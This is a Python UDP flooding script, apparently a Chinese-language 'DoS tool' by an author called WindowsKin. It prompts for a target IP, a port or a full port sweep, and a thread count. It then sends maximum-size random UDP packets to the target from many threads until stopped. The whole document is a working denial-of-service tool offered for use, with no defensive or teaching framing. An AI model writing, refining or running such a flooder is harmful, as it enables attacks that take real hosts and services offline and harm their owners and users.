from socket import socket , AF_INET , SOCK_DGRAM
from threading import Thread
from os import system , name
from time import sleep
from random import randbytes , _urandom

condition = True
sock = socket(AF_INET , SOCK_DGRAM)

if name == "nt":
    def clear_shell():
        system("cls")
else:
    def clear_shell():
        system("clear")

clear_shell()
ip = input("""
Python3  dos工具

作者          : WindowsKin
版本          : V1.1

请输入 IP : """)
mode_p = input("""
1.字节数据
2.数据包
请输入攻击类型 : """)
if mode_p == "1":
    bytes = randbytes(65507)
elif mode_p == "2":
    bytes = _urandom(65507)
else:
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    bytes = _urandom(65507)
mode = input("""
1.从指定端口进行攻击
2.从端口 1 ~ 65534 循环遍历进行攻击
请输入攻击方式 : """)
if mode == "1":
    while True:
        try:
            port = int(input("请输入 端口 : "))
            if port > 65535 or port < 0:
                print("检测到你输入了无效内容，请重新输入")
                sleep(2)
                continue
        except ValueError:
            print("检测到你输入了无效内容，请重新输入")
            sleep(2)
        else:
            break
elif mode != "2":
    print('检测到你输入了无效内容，已以为你选择默认值"2"')
    sleep(2)
    mode = "2"
try:
    sc = int(input("请输入 线程数量(不能为0) : "))
    if sc == 0:
        print('检测到你输入了无效内容，已以为你选择默认值"1"')
        sleep(2)
        sc = 1
except ValueError:
    print('检测到你输入了无效内容，已以为你选择默认值"1"')
    sleep(2)
    sc = 1
clear_shell()

if mode == "1":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip} {port} 端口")
elif mode == "2":
    print(f"已选攻击方式 {mode} 进行攻击\n攻击程序正在攻击 {ip}")

def dos_1(bytes , ip , port):
    global condition
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
        except:
            pass

def dos_2(bytes , ip):
    global condition
    port = 4444
    while condition:
        try:
            sock.sendto(bytes , (ip , port))
            if port == 65535:
                port = 0
            else:
                port += 1
        except:
            pass

if mode == "1":
    for i in range(sc):
        dos_sc = Thread(target = dos_1 , args = (bytes , ip , port))
        dos_sc.start()
elif mode == "2":
    for i in range(sc):
        dos_sc = Thread(target = dos_2 , args = (bytes , ip))
        dos_sc.start()

input("按Enter键停止攻击")
condition = False